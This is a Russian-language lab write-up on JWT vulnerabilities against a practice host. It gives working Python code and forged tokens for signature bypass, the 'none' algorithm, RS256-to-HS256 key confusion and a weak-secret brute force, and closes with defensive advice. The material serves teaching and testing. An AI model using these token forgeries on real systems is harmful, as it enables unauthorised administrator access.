# JSON Web Token (JWT) insecure  

# Описание

JSON Web Token (JWT) - открытый стандарт (RFC 7519), который определяет компактный способ передачи данных как JSON-объектов. 
Эти данные могут быть верифицированы и подтверждены, так как они подписываются secret ключом. 
JWT часто используются в качестве механизма для управления сессиями.

JWT токен состоит из 3 частей, которые раздены точками: 
1. `Header`: определяет какой алгоритм будет использован для генерации `Signature` 
2. `Payload`: некоторая полезная нагрузка
3. `Signature`: подпись, которая вычисляется на основании `Header` и `Payload` и зависит от выбранного алгоритма. 

# Уязвимости
1. Отсутствие проверки подписи,
2. Возможно изменение алгоритма подписи,
3. "Слабый" secret key signature,
4. Возможно использовать none алгоритм для signature.

# Возможные векторы атаки
- Отсутствие проверки подписи,
- Возможно использовать алгоритм `None` для проверки подписи
- Возможно изменение алгоритма подписи с RSA на HMAC тип
- "Слабый" secret ключ
- Недостаточная валидация `kid` параметра
  
# Условия

- ОС: любая 
- язык: любой
- компоненты: библиотеки JWT
- настройки: зависят от библиотеки

# Детектирование
Убедиться, что используется JWT: инспекция исходного кода приложения, cookie, скрытых полей страниц, значений передаваемых параметров в запросах. Необходимо искать данные, которые начинаются с `eyJ0eXAiOi`

# Отсутствие проверки подписи
Данная уязвимость заключается в том, что на стороне сервера не проводится проверка правильности подписи (`Signature`).

## Эксплуатация

### Шаг 1

Получаем JWT токен, для этого логинимся на http://jwt_insecure.lab/login

В cookie `session` сервер передает JWT токен.
```
session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc
```

Для наглядности идем [сюда](https://jwt.io/) и декодируем JWT токен.

**Header
```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```
**Payload
```json
{
  "username": "user",
  "is_admin": false
}
```

### Шаг 2
 
Генерируем новый JWT токен c измененным `Payload`, у которого `Signature` может быть абсолютно любым.
Для этого можно использовать следующий код:

```python
import base64

def b64urlencode(data):
    return base64.b64encode(data.encode('ascii')).decode('ascii').replace('+', '-').replace('/', '_').replace('=', '')

print('%s.%s.%s' % (
        b64urlencode('{"typ":"JWT","alg":"RS256"}'), # Header
        b64urlencode('{"username":"user","is_admin":true}'), # Payload
        b64urlencode('secret_signature'), ) # Some signature, not important
)
```

Полученный JWT токен
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6dHJ1ZX0.c2VjcmV0X3NpZ25hdHVyZQ
```

### Шаг 4

Заходим на http://jwt_insecure.lab/index_1 и меняем в заголовке запроса значение session cookie на сгенерированный токен.

Исходный запрос

![](img/utp_6.png)

Запрос после изменения токена

![](img/utp_7.png)

Ответ от сервера

![](img/utp_8.png)

# Алгоритм None

В качестве алгоритма подписи может поддерживаться алгоритм `None` (отсутствие подписи). `None` алгоритм на самом деле ничего не подписывает, в данном случае `Signature` часть JWT токена становится пустой. Все это позволяет менять содержимое токена без каких либо последствий.

Уязвимости могут быть подвержены утсраевшие библиотеки, т.к. о проблеме писали в 2015 году и большинство JWT-библиотек были пофикшены.

## Эксплуатация

### Шаг 1
 
Генерируем JWT токен, у которого в заголовке указан алгоритм `None` и `Signature` часть пустая. Для этого можно использовать следующий код.

```python
import base64

def b64urlencode(data):
    return base64.b64encode(data.encode('ascii')).decode('ascii').replace('+', '-').replace('/', '_').replace('=', '')

print('%s.%s' % (
        b64urlencode('{"typ":"JWT","alg":"none"}'), # Header with none
        b64urlencode('{"username":"user","is_admin":false}'), ) # Payload
)
```

Полученный JWT токен
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.
```

### Шаг 2

Заходим на http://jwt_insecure.lab/index_3 и меняем в заголовке запроса значение cookie session на сгенерированный токен.

Исходный запрос

![](img/utp_1.png)

Запрос после изменения токена

![](img/utp_2.png)

Ответ от сервера

![](img/utp_3.png)

# Изменение алгоритма проверки с RSA на HMAC

Данная уязвимость связана с особенностями реализации подписи JWT токена на основе RSA.
Алгоритмы на основе HMAC использует secret key для подписи и верификации. 
Алгоритмы на основе RSA испльзует private key для подписи и public key для верификации.

Если используется RS256. То при верификации можно попробывать изменить алгоритм в `Header` с RS256 на HS256. В таком случае, сервер будет использовать public key в качестве HMAC secret key, а затем использовать алгоритм HS256 для верификации сигнатуры. 

Так как иногда может происходить утечка public key, можно изменить алгоритм в Header на HS256 и затем переподписать токен public ключом алгоритма RSA. 

Сервер будет верифицировать токен как HS256, используя как секрет RSA public key. 

## Эксплуатация 

### Шаг 1 

Идем на http://jwt_insecure.lab/index_2, на которой расположен base64 от public ключа

![](img/rshs_1.png)

```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FERk44dDdhS1UxbmQ2K1RQYkZFWVJmenIzWApnSE1QZGdzdVZ1c3MrL1UwMjNtRW1vajJ4Zy9lamR0V0UwTWJRUUxkT28rOXlqZmRNbWowYy9NbGYrYXF0M1lPCkNkUWtVV0l1RFZUOVVPTnRBUkFtYWNxQzNQT0xBNXgrcEIyc0ZieWNhT2ZQS2xYV3I2RXZVd2V0TW1PaWNuR1YKeGwrMEIwZDhid1d3TldPV0p3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=
```

### Шаг 2

Генерируем новый session_rsa cookie подписанный public ключом. Для этого можно использовать следующий код.

```python
# important: pyjwt version <= 0.4.2
import jwt
import base64

public_key = base64.b64decode(
        'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FERk44dDdhS1UxbmQ2K1RQYk'
        'ZFWVJmenIzWApnSE1QZGdzdVZ1c3MrL1UwMjNtRW1vajJ4Zy9lamR0V0UwTWJRUUxkT28rOXlqZmRNbWowYy9NbGYrYXF0M1lPCkNkUWtVV0l1'
        'RFZUOVVPTnRBUkFtYWNxQzNQT0xBNXgrcEIyc0ZieWNhT2ZQS2xYV3I2RXZVd2V0TW1PaWNuR1YKeGwrMEIwZDhid1d3TldPV0p3SURBUUFCCi'
        '0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=')

print(jwt.encode(
            {'username': 'user', 'is_admin': True}, 
            key=public_key, 
            algorithm='HS256'
            ).decode()
)
```

Переходим на http://jwt_insecure.lab/index_2

![](img/rshs_2.png)

Заменяем session_rsa cookie на полученный токен.

![](img/rshs_3.png)

Результат.

![](img/rshs_4.png)

# "Слабый" secret key signature

Если используемый HMAC алгоритм подписи использует слабый или по-умолчанию ключ, то его можно получить с помощью простого перебора.
Это можно сделать с помощью различных утилит (по ссылкам найдете примеры команд):
- [Hashcat](https://twitter.com/hashcat/status/955154646494040065)
- [jwt tool](https://github.com/ticarpi/jwt_tool)

## Эксплуатация

### Шаг 1

Берем JWT подписаный с помощью алгоритма HS256
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc
```

Составляем или скачиваем wordlist для перебора.

Используя jwt_tool, подбираем secret key.

```bash
python2 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc wordlist.txt
```

![](img/brute_1.png)

В данном случае в качестве ключа использовалась строка secret.

### Шаг 2

Генерируем новый JWT токен, подписаный данным ключом:
```python
import jwt

print(jwt.encode(
            {'username': '3v1lH4xx0r', 'is_admin': True}, 
            key='secret', 
            algorithm='HS256'
            ).decode()
)
```

Полученный JWT токен

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjN2MWxINHh4MHIiLCJpc19hZG1pbiI6dHJ1ZX0.ZOI8SQBvAQngYGVI2YYk-F1TWJc-amSmHs-c1Ai2ed4
```

### Шаг 3

Используем сгенерированный JWT токен

![](img/brute_2.PNG)


# Недостаточная валидация `kid` параметра

Существуют стандартные поля, используемые в заголовке JWT. Один из них - `kid` - уникальный идентификатор используемого ключа (Key ID). Он указывается когда на сервере используются несколько различных ключей.
Если имеется возможность добавлять свои ключи на сервер, то атакующий может сгенерировать свой пару ключ, загрузить его на сервер, и отправить самодписаный JWT токен, указав в параметре `kid`идентификатор загруженного ключа. Таким образом можно отправлять токены, которые будут успешно верифицированные на сервере.

Помимо этого, может быть проблема валидации параметра `kid`. Ключ может храниться на файловой системе или в базе данных. Если есть проблема недостаточной валидации, то можно попробовать изменить само значение ключа на заранее известное и подписать ключ этим значением.

# Защита

1. Проверять актуальность библиотек на своих ресурсах.
2. Использовать сильные secret ключи. Не использовать одинаковые ключи
3. Всегда проводить верификацию подписи у токена, который присылает клиент
4. В случае использования архитектуры, где проверка токена может выполняться на нескольких серверах, следут использовать RSA. Потому что мы сможем скопировать RSA public ключ на все сервера, и при  компрометации одного из серверов, злоумышленник не получит секретный ключ.
5. Захардкодить алгоритм при верификации токена.

# Дополнительно

1. https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6
2. https://nandynarwhals.org/hitbgsec2017-pasty/
